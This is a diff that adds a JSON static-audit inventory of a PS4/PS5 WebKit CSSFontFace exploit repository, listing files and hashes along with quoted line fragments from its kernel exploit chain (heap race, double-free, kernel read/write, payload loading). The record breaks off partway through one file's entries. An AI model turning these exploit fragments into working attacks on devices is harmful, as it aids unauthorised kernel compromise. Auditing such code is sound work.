@@ -1,0 +1,2718 @@
+{
+  "repository": "ntfargo/CSSFontFace-Exploit",
+  "audited_head": "221baa6e7349b96a6fd299808a25a4178e47741c",
+  "scope": "static inventory only",
+  "executed_code": false,
+  "13_52_compatibility": "NOT_ESTABLISHED",
+  "files": [
+    {
+      "path": ".git/HEAD",
+      "size": 21,
+      "sha256": "28d25bf82af4c0e2b72f50959b2beb859e3e60b9630a5e8c603dad4ddb2b6e80",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/config",
+      "size": 320,
+      "sha256": "8909ab4911d41d4b977caea39a2b67dfd4205c1b371ee0d49eeb8635614ed3b4",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/description",
+      "size": 73,
+      "sha256": "85ab6c163d43a17ea9cf7788308bca1466f1b0a8d1cc92e26e9bf63da4062aee",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/applypatch-msg.sample",
+      "size": 478,
+      "sha256": "0223497a0b8b033aa58a3a521b8629869386cf7ab0e2f101963d328aa62193f7",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/commit-msg.sample",
+      "size": 896,
+      "sha256": "1f74d5e9292979b573ebd59741d46cb93ff391acdd083d340b94370753d92437",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/fsmonitor-watchman.sample",
+      "size": 4726,
+      "sha256": "e0549964e93897b519bd8e333c037e51fff0f88ba13e086a331592bf801fa1d0",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/post-update.sample",
+      "size": 189,
+      "sha256": "81765af2daef323061dcbc5e61fc16481cb74b3bac9ad8a174b186523586f6c5",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/pre-applypatch.sample",
+      "size": 424,
+      "sha256": "e15c5b469ea3e0a695bea6f2c82bcf8e62821074939ddd85b77e0007ff165475",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/pre-commit.sample",
+      "size": 1643,
+      "sha256": "f9af7d95eb1231ecf2eba9770fedfa8d4797a12b02d7240e98d568201251244a",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/pre-merge-commit.sample",
+      "size": 416,
+      "sha256": "d3825a70337940ebbd0a5c072984e13245920cdf8898bd225c8d27a6dfc9cb53",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/pre-push.sample",
+      "size": 1374,
+      "sha256": "ecce9c7e04d3f5dd9d8ada81753dd1d549a9634b26770042b58dda00217d086a",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/pre-rebase.sample",
+      "size": 4898,
+      "sha256": "4febce867790052338076f4e66cc47efb14879d18097d1d61c8261859eaaa7b3",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/pre-receive.sample",
+      "size": 544,
+      "sha256": "a4c3d2b9c7bb3fd8d1441c31bd4ee71a595d66b44fcf49ddb310252320169989",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/prepare-commit-msg.sample",
+      "size": 1492,
+      "sha256": "e9ddcaa4189fddd25ed97fc8c789eca7b6ca16390b2392ae3276f0c8e1aa4619",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/push-to-checkout.sample",
+      "size": 2783,
+      "sha256": "a53d0741798b287c6dd7afa64aee473f305e65d3f49463bb9d7408ec3b12bf5f",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/sendemail-validate.sample",
+      "size": 2308,
+      "sha256": "44ebfc923dc5466bc009602f0ecf067b9c65459abfe8868ddc49b78e6ced7a92",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/hooks/update.sample",
+      "size": 3650,
+      "sha256": "8d5f2fa83e103cf08b57eaa67521df9194f45cbdbcb37da52ad586097a14d106",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/index",
+      "size": 3286,
+      "sha256": "a905452a164316ff0e723c73e0bd2e6cd292d4ac515d2d561063f9aea058c125",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/info/exclude",
+      "size": 240,
+      "sha256": "6671fe83b7a07c8932ee89164d1f2793b2318058eb8b98dc5c06ee0a5a3b0ec1",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/logs/HEAD",
+      "size": 238,
+      "sha256": "55b45dc210cc07e8ea1d2d85c90d1a3f4459b485966d076fc330603460ed0a70",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/logs/refs/heads/main",
+      "size": 238,
+      "sha256": "55b45dc210cc07e8ea1d2d85c90d1a3f4459b485966d076fc330603460ed0a70",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/logs/refs/remotes/origin/HEAD",
+      "size": 238,
+      "sha256": "55b45dc210cc07e8ea1d2d85c90d1a3f4459b485966d076fc330603460ed0a70",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-273dd4ec656670aa717d86a7ec9c0e0453c94648.idx",
+      "size": 2024,
+      "sha256": "acbbab99b658f12033167c488178134d9f48de3795bf0fbbfa051bed3d1ddee3",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-273dd4ec656670aa717d86a7ec9c0e0453c94648.pack",
+      "size": 87127,
+      "sha256": "946207116cdb4c658d3ff9867c9f4bffd6cd73a56b36b022643939814032f97d",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-273dd4ec656670aa717d86a7ec9c0e0453c94648.promisor",
+      "size": 0,
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-273dd4ec656670aa717d86a7ec9c0e0453c94648.rev",
+      "size": 188,
+      "sha256": "bb84946c1f2b62db76b473d0e8b5bfc5e6d8a3356446a2477f3c98d6b5c242e4",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-788e76065bbabe5dbb60ed9f6d00cbe1c528e703.idx",
+      "size": 4488,
+      "sha256": "93315b28a592ddff68f348bc79a9d54b119ef8c9816dfcea1eb829a2bba4fd87",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-788e76065bbabe5dbb60ed9f6d00cbe1c528e703.pack",
+      "size": 27300,
+      "sha256": "cd88efff3d209c7027f18d920f369a5ba630097316a1db9d803ef2a00b910805",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-788e76065bbabe5dbb60ed9f6d00cbe1c528e703.promisor",
+      "size": 103,
+      "sha256": "dddad6dd6cf8af740459017ac241ac51a2ad68b1f7c89853319d3314574a2c81",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/objects/pack/pack-788e76065bbabe5dbb60ed9f6d00cbe1c528e703.rev",
+      "size": 540,
+      "sha256": "9939f81fd2489ecce749f86b7a510af2917c666d5466999beb2bd8ddf3ae79fc",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/packed-refs",
+      "size": 112,
+      "sha256": "0a118a19d7391647332c367537d755db26769a1e5adb891f71e9a63d5cd9592a",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/refs/heads/main",
+      "size": 41,
+      "sha256": "ddb54f03695c94e8c700239ed7e84938d0d12bb66616f132e375c89294df7e34",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": ".git/refs/remotes/origin/HEAD",
+      "size": 30,
+      "sha256": "2bb6a24aa0fc6c484100f5d51a29bbad841cd2c755f5d93faa204e5dbb4eb2b4",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "LICENSE",
+      "size": 1069,
+      "sha256": "27733007935689bfd85e2a13aae08144377e385b9d2aec9b72de295b9a6218f0",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "README.md",
+      "size": 1897,
+      "sha256": "860db9e43151442f43324093d16fe9bbcb2224be83bb2c3ef3412fb9104f6a27",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 12,
+      "markers": [
+        {
+          "line": 1,
+          "text": "# WebKit CSSFontFace Exploit for PS4/PS5"
+        },
+        {
+          "line": 5,
+          "text": "|               | CSSFontFace |"
+        },
+        {
+          "line": 7,
+          "text": "| PlayStation 4 | 6.00-13.52  |"
+        },
+        {
+          "line": 12,
+          "text": "|               | CSSFontFace |"
+        },
+        {
+          "line": 14,
+          "text": "| PlayStation 4 | 6.00-11.02  |"
+        },
+        {
+          "line": 21,
+          "text": "|               | CSSFontFace | Kernel Exploit |"
+        },
+        {
+          "line": 23,
+          "text": "| PlayStation 4 | 6.00-11.02  | 7.00-11.02     |"
+        },
+        {
+          "line": 26,
+          "text": "* add your payload/hen of choice in public/src named as `payload.bin`"
+        },
+        {
+          "line": 30,
+          "text": "* Newer WebKit versions on PlayStation 4 [11.5x-latest] and PlayStation 5 [9.00-latest] redesigned CSSFontFace get/set property handling and introduced `m_propertiesOrCSSConnection`. Because of this and other layout changes, the `m_featureSettings` read/write primitive used by this repository is no longer usable on firmware versions above the ranges listed here."
+        },
+        {
+          "line": 31,
+          "text": "* On PlayStation 5, vtable checks and WebKit ASLR prevent this repository's chain from working unless a separate ASLR defeat and vtable recovery workaround is found."
+        },
+        {
+          "line": 33,
+          "text": "Technical writeup: https://linearfox.com/blog/cssfontface-uaf-playstation"
+        },
+        {
+          "line": 41,
+          "text": "Old PS5 Webkit contributors. (2022) https://github.com/ChendoChap/PS5-Webkit-Execution"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "host.py",
+      "size": 351,
+      "sha256": "9934f178a056bfc377de5bff40640fa8d4c2682a087d8b1397ca479f5541e55d",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "localhost.pem",
+      "size": 2949,
+      "sha256": "230c6051676d7bc2f339a50cf9eb9d8019c3651cbb428b69f0ad9d6ea774d1e6",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/cache.manifest",
+      "size": 635,
+      "sha256": "2e35336305274ce2f4d4ab1193bec29566f79cef8f5feb18e711749233fe9ec2",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/includes/cat.jpg",
+      "size": 39942,
+      "sha256": "bcdaddbcc7c003b70056a8cbd9d68f184d09c1de0013765853ee06f609bb5723",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 0,
+      "markers": [],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/includes/script.js",
+      "size": 2998,
+      "sha256": "e1ffd9fae52b89c843d103089e4c3737f50eb129f1b7f4b0248db6348c319738",
+      "category": "WEBKIT_RESEARCH_REFERENCE",
+      "marker_count": 3,
+      "markers": [
+        {
+          "line": 10,
+          "text": "// choose one of kernel exploits"
+        },
+        {
+          "line": 14,
+          "text": "const kexForm = document.getElementById('kernel-options');"
+        },
+        {
+          "line": 80,
+          "text": "document.title = \"CSSFontFace exploit\";"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/includes/style.css",
+      "size": 1548,
+      "sha256": "f24576d929fdc03aa2006e3195447e1bb8740161001def500e07efec45a1d097",
+      "category": "WEBKIT_RESEARCH_REFERENCE",
+      "marker_count": 2,
+      "markers": [
+        {
+          "line": 83,
+          "text": "#kernel-options {"
+        },
+        {
+          "line": 88,
+          "text": "-webkit-appearance: none;"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/index.html",
+      "size": 1235,
+      "sha256": "0a66a76be8815caf8fc2c012811b0795bafce86758b89a42915afda6fb930c67",
+      "category": "WEBKIT_RESEARCH_REFERENCE",
+      "marker_count": 5,
+      "markers": [
+        {
+          "line": 6,
+          "text": "<title>CSSFontFace exploit</title>"
+        },
+        {
+          "line": 11,
+          "text": "<h1>CSSFontFace UAF Exploit</h1>"
+        },
+        {
+          "line": 17,
+          "text": "<form id=\"kernel-options\">"
+        },
+        {
+          "line": 18,
+          "text": "<input type=\"radio\" name=\"kernel\" id=\"netctrl-exploit\" value=\"netctrl\">"
+        },
+        {
+          "line": 20,
+          "text": "<input type=\"radio\" name=\"kernel\" id=\"lapse-exploit\" value=\"lapse\">"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/lapse.js",
+      "size": 35571,
+      "sha256": "8a3841c61ff8219c9b996672da74dbf65a57f5265265d6665c30449a14b4aeae",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 79,
+      "markers": [
+        {
+          "line": 2,
+          "text": "const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78"
+        },
+        {
+          "line": 10,
+          "text": "const SCE_KERNEL_ERROR_ESRCH = 0x80020003;"
+        },
+        {
+          "line": 65,
+          "text": "mem.bset(reqs1.addr, SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);"
+        },
+        {
+          "line": 80,
+          "text": "const ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);"
+        },
+        {
+          "line": 82,
+          "text": "fn.aio_submit_cmd.invoke(cmd, reqs1.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);"
+        },
+        {
+          "line": 86,
+          "text": "function process_aio(op, ids, offset = 0, count = ids.length - offset) {"
+        },
+        {
+          "line": 93,
+          "text": "const ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);"
+        },
+        {
+          "line": 96,
+          "text": "fn.aio_multi_cancel.invoke(ids_offset_addr, step, outs_addr);"
+        },
+        {
+          "line": 100,
+          "text": "fn.aio_multi_wait.invoke(ids_offset_addr, step, outs_addr, AIO_WAIT_AND, 0);"
+        },
+        {
+          "line": 104,
+          "text": "fn.aio_multi_poll.invoke(ids_offset_addr, step, outs_addr);"
+        },
+        {
+          "line": 108,
+          "text": "fn.aio_multi_delete.invoke(ids_offset_addr, step, outs_addr);"
+        },
+        {
+          "line": 112,
+          "text": "offset += step;"
+        },
+        {
+          "line": 128,
+          "text": "importScripts(\"ps4/kernel.js\");"
+        },
+        {
+          "line": 184,
+          "text": "throw new Error(`${v} not a kernel pointer !!`);"
+        },
+        {
+          "line": 278,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[i]} !!`);"
+        },
+        {
+          "line": 286,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[i]} !!`);"
+        },
+        {
+          "line": 294,
+          "text": "throw new SyscallError(`Unable to get socket option for fd ${ipv6_socks[j]} !!`);"
+        },
+        {
+          "line": 315,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);"
+        },
+        {
+          "line": 353,
+          "text": "const aio_rw_req_buf = mem.alloc(SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);"
+        },
+        {
+          "line": 354,
+          "text": "reqs1 = SceKernelAioRWRequest.new(aio_rw_req_buf);"
+        },
+        {
+          "line": 362,
+          "text": "throw new SyscallError(\"Unable to create socket pair !!\");"
+        },
+        {
+          "line": 389,
+          "text": "throw new SyscallError(`Unable to close fd ${sock} !!`);"
+        },
+        {
+          "line": 409,
+          "text": "throw new SyscallError(`Unable to close fd ${sock} !!`);"
+        },
+        {
+          "line": 419,
+          "text": "throw new SyscallError(`Unable to close fd ${sock} !!`);"
+        },
+        {
+          "line": 429,
+          "text": "throw new SyscallError(`Unable to close fd ${sock} !!`);"
+        },
+        {
+          "line": 482,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);"
+        },
+        {
+          "line": 488,
+          "text": "throw new SyscallError(`Unable to bind socket ${server_sock} !!`);"
+        },
+        {
+          "line": 492,
+          "text": "throw new SyscallError(`Unable to listen socket ${server_sock} !!`);"
+        },
+        {
+          "line": 504,
+          "text": "const aio_ids_offset_addr = aio_ids.buffer.data().add(which_req * Uint32Array.BYTES_PER_ELEMENT);"
+        },
+        {
+          "line": 505,
+          "text": "const outs_offset_addr = outs.buffer.data().add(1 * Uint32Array.BYTES_PER_ELEMENT);"
+        },
+        {
+          "line": 515,
+          "text": "throw new SyscallError(`Unable to connect socket ${client_sock} !!`);"
+        },
+        {
+          "line": 521,
+          "text": "throw new SyscallError(`Unable to accept socket ${server_sock} !!`);"
+        },
+        {
+          "line": 526,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${client_sock} !!`);"
+        },
+        {
+          "line": 536,
+          "text": "// drop the reference so that aio_multi_delete() will trigger _fdrop()"
+        },
+        {
+          "line": 538,
+          "text": "throw new SyscallError(`Unable to close fd ${client_sock} !!`);"
+        },
+        {
+          "line": 541,
+          "text": "const race_task = race_worker.execute(\"aio_delete\", aio_ids_offset_addr, outs_offset_addr);"
+        },
+        {
+          "line": 553,
+          "text": "throw new SyscallError(`Unable to get socket option for fd ${connected_sock} !!`);"
+        },
+        {
+          "line": 562,
+          "text": "if (outs[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {"
+        },
+        {
+          "line": 563,
+          "text": "// PANIC: double free on the 0x80 malloc zone. important kernel"
+        },
+        {
+          "line": 603,
+          "text": "throw new SyscallError(`Unable to close fd ${connected_sock} !!`);"
+        },
+        {
+          "line": 610,
+          "text": "throw new SyscallError(`Unable to close fd ${server_sock} !!`);"
+        },
+        {
+          "line": 629,
+          "text": "throw new SyscallError(`Unable to close fd ${rthdr_twins[1]} !!`);"
+        },
+        {
+          "line": 693,
+          "text": "// string is located at the kernel's mapped ELF file"
+        },
+        {
+          "line": 701,
+          "text": "// we now know the address of the kernel buffer we are leaking"
+        },
+        {
+          "line": 710,
+          "text": "// allocate reqs1 arrays at 0x100 kmalloc zone since SceKernelAioRWRequest.sizeof * 6 = 0xF0"
+        },
+        {
+          "line": 716,
+          "text": "// use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of"
+        },
+        {
+          "line": 846,
+          "text": "const reqs3_offset = 0x28;"
+        },
+        {
+          "line": 847,
+          "text": "const spray_reqs3_addr = spray_rthdr0_addr.add(reqs3_offset);"
+        },
+        {
+          "line": 848,
+          "text": "const leak_reqs3_addr = leak_rthdr0_addr.add(reqs3_offset);"
+        },
+        {
+          "line": 855,
+          "text": "spray_aio_entry.ar2_batch = reqs2_addr.add(reqs3_offset); // reqs3 offset"
+        },
+        {
+          "line": 857,
+          "text": "// use reqs1 to fake a aio_batch at offset 0x28."
+        },
+        {
+          "line": 881,
+          "text": "throw new SyscallError(`Unable to close fd ${rthdr_twins[0]} !!`);"
+        },
+        {
+          "line": 972,
+          "text": "// PANIC: double free on the 0x100 malloc zone. important kernel data may alias"
+        },
+        {
+          "line": 996,
+          "text": "if (status[0] !== SCE_KERNEL_ERROR_ESRCH) {"
+        },
+        {
+          "line": 1007,
+          "text": "logger.info(\"Initiate kernel ARW...\");"
+        },
+        {
+          "line": 1020,
+          "text": "throw new SyscallError(`Unable to close fd ${pktopts_twins[1]} !!`);"
+        },
+        {
+          "line": 1038,
+          "text": "throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);"
+        },
+        {
+          "line": 1078,
+          "text": "let offset = 0;"
+        },
+        {
+          "line": 1079,
+          "text": "while (offset < 8) {"
+        },
+        {
+          "line": 1080,
+          "text": "arw.view(pktinfo_addr).setBInt(8, addr.add(offset), true); // pktopts.ip6po_nexthop = addr + offset"
+        },
+        {
+          "line": 1083,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);"
+        },
+        {
+          "line": 1086,
+          "text": "arw.view(nhop_addr).setInt32(0, 8 - offset, true);"
+        },
+        {
+          "line": 1088,
+          "text": "if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_NEXTHOP, buf_addr.add(offset), nhop_addr) === -1) {"
+        },
+        {
+          "line": 1089,
+          "text": "throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);"
+        },
+        {
+          "line": 1094,
+          "text": "arw.view(buf_addr).setUint8(offset, 0);"
+        },
+        {
+          "line": 1095,
+          "text": "offset += 1;"
+        },
+        {
+          "line": 1097,
+          "text": "offset += n;"
+        },
+        {
+          "line": 1112,
+          "text": "kernel_base = evf_cv_addr.sub(constants.EVF_OFFSET);"
+        },
+        {
+          "line": 1113,
+          "text": "logger.info(`kernel base: ${kernel_base}`);"
+        },
+        {
+          "line": 1120,
+          "text": "throw new Error(`${p} is not valid kernel address !!`);"
+        },
+        {
+          "line": 1157,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);"
+        },
+        {
+          "line": 1165,
+          "text": "throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);"
+        },
+        {
+          "line": 1168,
+          "text": "kv = new KernelView(master_pipe, slave_pipe);"
+        },
+        {
+          "line": 1170,
+          "text": "logger.info(\"Achieved kernel ARW !!\");"
+        },
+        {
+          "line": 1187,
+          "text": "const SceKernelAioResult = new Struct(\"SceKernelAioResult\", ["
+        },
+        {
+          "line": 1193,
+          "text": "const SceKernelAioRWRequest = new Struct(\"SceKernelAioRWRequest\", ["
+        },
+        {
+          "line": 1194,
+          "text": "{ type: \"Uint64\", name: \"offset\" },"
+        },
+        {
+          "line": 1197,
+          "text": "{ type: \"SceKernelAioResult*\", name: \"result\" },"
+        },
+        {
+          "line": 1209,
+          "text": "{ type: \"SceKernelAioResult\", name: \"ar2_result\" },"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/loader.js",
+      "size": 1842,
+      "sha256": "57f9bce0340bb5c7d59b24a5370c86300063edec435ece75c1491e55dbd980c8",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 2,
+      "markers": [
+        {
+          "line": 23,
+          "text": "fn.pthread_create = new NativeFunction(webkit_base.add(constants.wk_pthread_create), \"number\");"
+        },
+        {
+          "line": 42,
+          "text": "throw new SyscallError(`Unable to map memory with size ${sz} !!`);"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/main.js",
+      "size": 3170,
+      "sha256": "799f5962c9f5084826804db5a2fffd8a38d70a9ce62637e195952ec572962eba",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 8,
+      "markers": [
+        {
+          "line": 36,
+          "text": "init_rop();"
+        },
+        {
+          "line": 37,
+          "text": "init_syscalls();"
+        },
+        {
+          "line": 46,
+          "text": "await load_script(\"src/ps4/kernel.js\");"
+        },
+        {
+          "line": 112,
+          "text": "const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);"
+        },
+        {
+          "line": 113,
+          "text": "const kpatches_buf = await kpatches_rsp.arrayBuffer();"
+        },
+        {
+          "line": 114,
+          "text": "const kpatches_u8 = new Uint8Array(kpatches_buf);"
+        },
+        {
+          "line": 116,
+          "text": "kernel_patches(kpatches_u8);"
+        },
+        {
+          "line": 118,
+          "text": "const bin_rsp = await fetch(\"src/payload.bin\");"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/misc.js",
+      "size": 11272,
+      "sha256": "4f96dddfda538e2776895979d55126a38ca3e3b1533a732e70115d09788c7834",
+      "category": "GENERIC_SUPPORTING_CODE",
+      "marker_count": 7,
+      "markers": [
+        {
+          "line": 122,
+          "text": "new Uint8Array(BInt.View.buffer).set(new Uint8Array(value.buffer, value.byteOffset, value.byteLength));"
+        },
+        {
+          "line": 451,
+          "text": "DataView.prototype.getBInt = function (byteOffset, littleEndian = false) {"
+        },
+        {
+          "line": 452,
+          "text": "const lo = this.getUint32(byteOffset, littleEndian);"
+        },
+        {
+          "line": 453,
+          "text": "const hi = this.getUint32(byteOffset + 4, littleEndian);"
+        },
+        {
+          "line": 457,
+          "text": "DataView.prototype.setBInt = function (byteOffset, value, littleEndian = false) {"
+        },
+        {
+          "line": 460,
+          "text": "this.setUint32(byteOffset, value.lo, littleEndian);"
+        },
+        {
+          "line": 461,
+          "text": "this.setUint32(byteOffset + 4, value.hi, littleEndian);"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/netctrl.js",
+      "size": 27457,
+      "sha256": "a31270f6ab2345d5f5ee515ed92bc7c6bd255b8f68da5091112f2a453cffdf5d",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 58,
+      "markers": [
+        {
+          "line": 58,
+          "text": "throw new SyscallError(`Unable to queue ${sock} in netevent !!`);"
+        },
+        {
+          "line": 74,
+          "text": "importScripts(\"ps4/kernel.js\");"
+        },
+        {
+          "line": 121,
+          "text": "importScripts(\"ps4/kernel.js\");"
+        },
+        {
+          "line": 147,
+          "text": "throw new SyscallError(\\`Unable to write vector of size \\${UIO_IOV_NUM} to fd \\${uio_ss[1]} !!\\`);"
+        },
+        {
+          "line": 160,
+          "text": "throw new SyscallError(\\`Unable to read vector of size \\${UIO_IOV_NUM} to fd \\${uio_ss[0]} !!\\`);"
+        },
+        {
+          "line": 302,
+          "text": "throw new SyscallError(\"Unable to create socket pair !!\");"
+        },
+        {
+          "line": 310,
+          "text": "throw new SyscallError(\"Unable to create socket pair !!\");"
+        },
+        {
+          "line": 337,
+          "text": "throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);"
+        },
+        {
+          "line": 349,
+          "text": "throw new SyscallError(`Unable to close fd ${sock} !!`);"
+        },
+        {
+          "line": 359,
